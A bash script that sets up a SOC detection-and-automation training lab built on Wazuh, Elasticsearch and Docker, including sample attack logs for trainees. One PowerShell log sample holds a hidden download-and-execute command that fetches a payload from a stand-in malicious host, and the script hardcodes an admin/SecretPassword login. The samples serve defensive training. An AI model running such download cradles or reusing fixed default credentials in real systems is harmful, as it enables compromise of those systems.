#!/bin/bash

# Detection & Automation Lab Training Setup Script
# This script prepares the complete training environment with all scenarios and data

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
LOG_FILE="$PROJECT_ROOT/training-setup.log"

# Functions
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
    exit 1
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$LOG_FILE"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$LOG_FILE"
}

info() {
    echo -e "${PURPLE}[INFO]${NC} $1" | tee -a "$LOG_FILE"
}

# Banner
show_banner() {
    echo -e "${BLUE}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║        🎯 Detection & Automation Lab Training Setup         ║
║                                                              ║
║     Comprehensive Security Operations Training Platform      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Check prerequisites
check_prerequisites() {
    log "Checking prerequisites..."
    
    # Check Docker
    if ! command -v docker &> /dev/null; then
        error "Docker is not installed. Please install Docker first."
    fi
    
    if ! docker info &> /dev/null; then
        error "Docker is not running. Please start Docker first."
    fi
    
    # Check Docker Compose
    if ! command -v docker-compose &> /dev/null; then
        error "Docker Compose is not installed. Please install Docker Compose first."
    fi
    
    # Check available disk space (minimum 10GB)
    available_space=$(df "$PROJECT_ROOT" | awk 'NR==2 {print $4}')
    if [ "$available_space" -lt 10485760 ]; then  # 10GB in KB
        warning "Less than 10GB disk space available. Training environment may not function properly."
    fi
    
    # Check available memory (minimum 8GB)
    available_memory=$(free -m | awk 'NR==2{printf "%.0f", $7}')
    if [ "$available_memory" -lt 6144 ]; then  # 6GB available memory
        warning "Less than 6GB memory available. Performance may be impacted."
    fi
    
    success "Prerequisites check completed"
}

# Setup environment configuration
setup_environment() {
    log "Setting up environment configuration..."
    
    cd "$PROJECT_ROOT"
    
    # Create .env file if it doesn't exist
    if [ ! -f ".env" ]; then
        log "Creating .env file from template..."
        cp .env.example .env
        
        # Generate secure passwords
        WAZUH_PASSWORD=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-25)
        ELASTIC_PASSWORD=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-25)
        POSTGRES_PASSWORD=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-25)
        
        # Update .env with generated passwords
        sed -i "s/WAZUH_PASSWORD=.*/WAZUH_PASSWORD=$WAZUH_PASSWORD/" .env
        sed -i "s/ELASTIC_PASSWORD=.*/ELASTIC_PASSWORD=$ELASTIC_PASSWORD/" .env
        sed -i "s/POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$POSTGRES_PASSWORD/" .env
        
        success "Environment file created with secure passwords"
    else
        info "Environment file already exists"
    fi
    
    # Create necessary directories
    mkdir -p logs
    mkdir -p data/wazuh
    mkdir -p data/elasticsearch
    mkdir -p data/postgres
    mkdir -p training/results
    mkdir -p training/exports
    
    success "Environment setup completed"
}

# Download and prepare training data
prepare_training_data() {
    log "Preparing training data and scenarios..."
    
    # Create sample log files for training
    mkdir -p "$PROJECT_ROOT/training/sample-data"
    
    # SSH brute force samples
    cat > "$PROJECT_ROOT/training/sample-data/ssh-bruteforce.log" << 'EOF'
Dec  7 10:15:23 server1 sshd[12345]: Failed password for admin from 192.168.1.100 port 22 ssh2
Dec  7 10:15:25 server1 sshd[12346]: Failed password for admin from 192.168.1.100 port 22 ssh2
Dec  7 10:15:27 server1 sshd[12347]: Failed password for admin from 192.168.1.100 port 22 ssh2
Dec  7 10:15:29 server1 sshd[12348]: Failed password for admin from 192.168.1.100 port 22 ssh2
Dec  7 10:15:31 server1 sshd[12349]: Failed password for admin from 192.168.1.100 port 22 ssh2
Dec  7 10:15:33 server1 sshd[12350]: Failed password for root from 192.168.1.100 port 22 ssh2
EOF

    # DNS tunneling samples
    cat > "$PROJECT_ROOT/training/sample-data/dns-tunneling.log" << 'EOF'
Dec  7 10:20:15 dns-server named[1234]: client 192.168.1.50#12345: query: dGVzdGRhdGExMjM0NTY3ODkw.malicious.com IN TXT +E (192.168.1.1)
Dec  7 10:20:16 dns-server named[1234]: client 192.168.1.50#12346: query: YWRkaXRpb25hbGRhdGFmb3J0dW5uZWw.malicious.com IN TXT +E (192.168.1.1)
Dec  7 10:20:17 dns-server named[1234]: client 192.168.1.50#12347: query: bW9yZWRhdGFmb3JleGZpbHRyYXRpb24.malicious.com IN TXT +E (192.168.1.1)
EOF

    # PowerShell obfuscation samples
    cat > "$PROJECT_ROOT/training/sample-data/powershell-obfuscation.log" << 'EOF'
Dec  7 10:25:10 workstation1 Microsoft-Windows-PowerShell[4103]: powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
Dec  7 10:25:12 workstation1 Microsoft-Windows-PowerShell[4104]: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
Dec  7 10:25:15 workstation1 Microsoft-Windows-PowerShell[4105]: powershell.exe -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')}"
EOF

    # Create training user accounts data
    cat > "$PROJECT_ROOT/training/sample-data/users.json" << 'EOF'
{
  "training_users": [
    {
      "username": "analyst1",
      "role": "SOC Analyst I",
      "level": "bronze",
      "scenarios": ["ssh-bruteforce", "basic-malware"]
    },
    {
      "username": "analyst2", 
      "role": "SOC Analyst II",
      "level": "silver",
      "scenarios": ["dns-tunneling", "powershell-attack", "lateral-movement"]
    },
    {
      "username": "engineer1",
      "role": "Detection Engineer",
      "level": "gold", 
      "scenarios": ["apt-simulation", "custom-rules", "performance-tuning"]
    }
  ]
}
EOF

    # Create MITRE ATT&CK mapping
    cat > "$PROJECT_ROOT/training/sample-data/mitre-mapping.json" << 'EOF'
{
  "techniques": {
    "T1110.001": {
      "name": "Password Guessing",
      "tactic": "Credential Access",
      "detection_rules": ["ssh-bruteforce", "rdp-bruteforce"],
      "training_scenarios": ["scenario-1"]
    },
    "T1071.004": {
      "name": "DNS",
      "tactic": "Command and Control", 
      "detection_rules": ["dns-tunneling", "dns-exfiltration"],
      "training_scenarios": ["scenario-2"]
    },
    "T1059.001": {
      "name": "PowerShell",
      "tactic": "Execution",
      "detection_rules": ["powershell-obfuscation", "powershell-execution"],
      "training_scenarios": ["scenario-3"]
    }
  }
}
EOF

    success "Training data prepared"
}

# Build and start services
start_services() {
    log "Building and starting training environment services..."
    
    cd "$PROJECT_ROOT"
    
    # Pull latest images
    log "Pulling Docker images..."
    docker-compose pull
    
    # Build custom images
    log "Building custom automation engine..."
    docker-compose build automation-engine
    
    log "Building log generator..."
    docker-compose build log-generator
    
    # Start services in order
    log "Starting Elasticsearch..."
    docker-compose up -d elasticsearch
    sleep 30
    
    log "Starting Wazuh manager..."
    docker-compose up -d wazuh-manager
    sleep 20
    
    log "Starting Wazuh dashboard..."
    docker-compose up -d wazuh-dashboard
    sleep 15
    
    log "Starting automation services..."
    docker-compose up -d automation-engine postgres redis
    sleep 10
    
    log "Starting supporting services..."
    docker-compose up -d log-generator kibana
    
    success "All services started"
}

# Wait for services to be ready
wait_for_services() {
    log "Waiting for services to be ready..."
    
    local max_attempts=60
    local attempt=1
    
    while [ $attempt -le $max_attempts ]; do
        log "Health check attempt $attempt/$max_attempts..."
        
        # Check Wazuh API
        if curl -k -s -u admin:SecretPassword https://localhost:55000/agents &> /dev/null; then
            success "Wazuh API is ready"
            break
        fi
        
        if [ $attempt -eq $max_attempts ]; then
            error "Services failed to start within expected time"
        fi
        
        sleep 10
        ((attempt++))
    done
    
    # Additional service checks
    log "Checking additional services..."
    
    # Check Elasticsearch
    if curl -s http://localhost:9200/_cluster/health &> /dev/null; then
        success "Elasticsearch is ready"
    else
        warning "Elasticsearch may not be fully ready"
    fi
    
    # Check automation engine
    if curl -s http://localhost:8000/health &> /dev/null; then
        success "Automation engine is ready"
    else
        warning "Automation engine may not be fully ready"
    fi
}

# Initialize training environment
initialize_training() {
    log "Initializing training environment..."
    
    # Load sample detection rules
    log "Loading detection rules..."
    docker-compose exec -T wazuh-manager bash << 'EOF'
# Restart Wazuh to load new rules
/var/ossec/bin/ossec-control restart
sleep 10
EOF

    # Initialize automation engine database
    log "Initializing automation database..."
    docker-compose exec -T automation-engine python << 'EOF'
from src.database import init_db
init_db()
print("Database initialized successfully")
EOF

    # Create training scenarios
    log "Setting up training scenarios..."
    docker-compose exec -T automation-engine python << 'EOF'
from src.training.scenario_manager import ScenarioManager
manager = ScenarioManager()
manager.create_default_scenarios()
print("Training scenarios created")
EOF

    # Generate initial sample data
    log "Generating sample security events..."
    docker-compose exec log-generator python log_generator.py mixed --count 50 --quiet

    success "Training environment initialized"
}

# Create training user accounts
create_training_accounts() {
    log "Creating training user accounts..."
    
    # Create accounts in automation system
    docker-compose exec -T automation-engine python << 'EOF'
from src.auth.user_manager import UserManager
import json

with open('/app/training/sample-data/users.json', 'r') as f:
    users_data = json.load(f)

user_manager = UserManager()
for user in users_data['training_users']:
    user_manager.create_training_user(
        username=user['username'],
        role=user['role'],
        level=user['level'],
        scenarios=user['scenarios']
    )
    print(f"Created training user: {user['username']}")
EOF

    success "Training accounts created"
}

# Setup monitoring and metrics
setup_monitoring() {
    log "Setting up training monitoring..."
    
    # Create monitoring dashboard
    docker-compose exec -T automation-engine python << 'EOF'
from src.monitoring.training_monitor import TrainingMonitor
monitor = TrainingMonitor()
monitor.setup_dashboards()
print("Training monitoring dashboards created")
EOF

    # Initialize metrics collection
    docker-compose exec -T automation-engine python << 'EOF'
from src.metrics.collector import MetricsCollector
collector = MetricsCollector()
collector.start_training_metrics()
print("Training metrics collection started")
EOF

    success "Monitoring setup completed"
}

# Generate training documentation
generate_documentation() {
    log "Generating training documentation..."
    
    # Create quick reference guide
    cat > "$PROJECT_ROOT/training/QUICK_REFERENCE.md" << 'EOF'
# 🚀 Training Lab Quick Reference

## Access Points
- **Wazuh Dashboard**: https://localhost:443 (admin/SecretPassword)
- **Automation API**: http://localhost:8000/docs
- **Kibana**: http://localhost:5601
- **Training Portal**: http://localhost:8000/training

## Common Commands
```bash
# Generate attack scenarios
docker-compose exec log-generator python log_generator.py [scenario] --count [num]

# Check service status
docker-compose ps

# View logs
docker-compose logs [service-name]

# Access training shell
docker-compose exec automation-engine bash
```

## Training Scenarios
1. **SSH Brute Force** - Basic detection and response
2. **DNS Tunneling** - Advanced pattern analysis  
3. **PowerShell Attacks** - Obfuscation and evasion
4. **Web Shell Detection** - File integrity monitoring
5. **Insider Threat** - Behavioral analysis

## Assessment Levels
- 🥉 **Bronze**: SOC Analyst I (Entry Level)
- 🥈 **Silver**: SOC Analyst II (Intermediate)  
- 🥇 **Gold**: Detection Engineer (Advanced)

## Support
- Documentation: `/training/` directory
- Troubleshooting: `TRAINING_PLAYBOOK.md`
- Assessment: `ASSESSMENT_FRAMEWORK.md`
EOF

    # Create training completion certificate template
    cat > "$PROJECT_ROOT/training/CERTIFICATE_TEMPLATE.md" << 'EOF'
# 🏆 Detection & Automation Lab Certificate

**This certifies that**

## [PARTICIPANT NAME]

**has successfully completed the Detection & Automation Lab training program**

**Level Achieved:** [BRONZE/SILVER/GOLD]  
**Date Completed:** [DATE]  
**Score:** [SCORE]%  
**Scenarios Completed:** [SCENARIO LIST]

**Skills Demonstrated:**
- Security event detection and analysis
- Automated response implementation  
- SIEM tool proficiency
- Incident response procedures
- Integration and orchestration

**Certified by:** Detection & Automation Lab Training Program  
**Valid Until:** [EXPIRATION DATE]

---
*This certificate demonstrates practical competency in modern security operations and detection engineering.*
EOF

    success "Training documentation generated"
}

# Show training environment status
show_status() {
    log "Training Environment Status:"
    echo ""
    
    # Service status
    info "🔧 Service Status:"
    docker-compose ps
    echo ""
    
    # Access information
    info "🌐 Access Points:"
    echo "  📊 Wazuh Dashboard: https://localhost:443"
    echo "     Username: admin"
    echo "     Password: SecretPassword"
    echo ""
    echo "  🤖 Automation API: http://localhost:8000/docs"
    echo "  📈 Kibana: http://localhost:5601"
    echo "  🎯 Training Portal: http://localhost:8000/training"
    echo ""
    
    # Training accounts
    info "👥 Training Accounts:"
    echo "  🥉 analyst1 (Bronze Level)"
    echo "  🥈 analyst2 (Silver Level)" 
    echo "  🥇 engineer1 (Gold Level)"
    echo ""
    
    # Quick start commands
    info "⚡ Quick Start Commands:"
    echo "  # Generate SSH brute force scenario"
    echo "  docker-compose exec log-generator python log_generator.py ssh-bruteforce --count 10"
    echo ""
    echo "  # Check automation engine status"
    echo "  curl http://localhost:8000/health"
    echo ""
    echo "  # View training scenarios"
    echo "  curl http://localhost:8000/training/scenarios"
    echo ""
    
    # Documentation
    info "📚 Documentation:"
    echo "  📖 Training Playbook: ./TRAINING_PLAYBOOK.md"
    echo "  📊 Assessment Framework: ./training/ASSESSMENT_FRAMEWORK.md"
    echo "  🚀 Quick Reference: ./training/QUICK_REFERENCE.md"
    echo ""
}

# Cleanup function
cleanup_on_error() {
    error "Setup failed. Cleaning up..."
    docker-compose down -v 2>/dev/null || true
    exit 1
}

# Main setup function
main() {
    show_banner
    
    # Set trap for cleanup on error
    trap cleanup_on_error ERR
    
    log "Starting Detection & Automation Lab Training Setup..."
    
    check_prerequisites
    setup_environment
    prepare_training_data
    start_services
    wait_for_services
    initialize_training
    create_training_accounts
    setup_monitoring
    generate_documentation
    
    success "🎉 Training environment setup completed successfully!"
    echo ""
    show_status
    
    info "🎓 Ready to start training! Check the TRAINING_PLAYBOOK.md for scenarios."
}

# Script execution
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi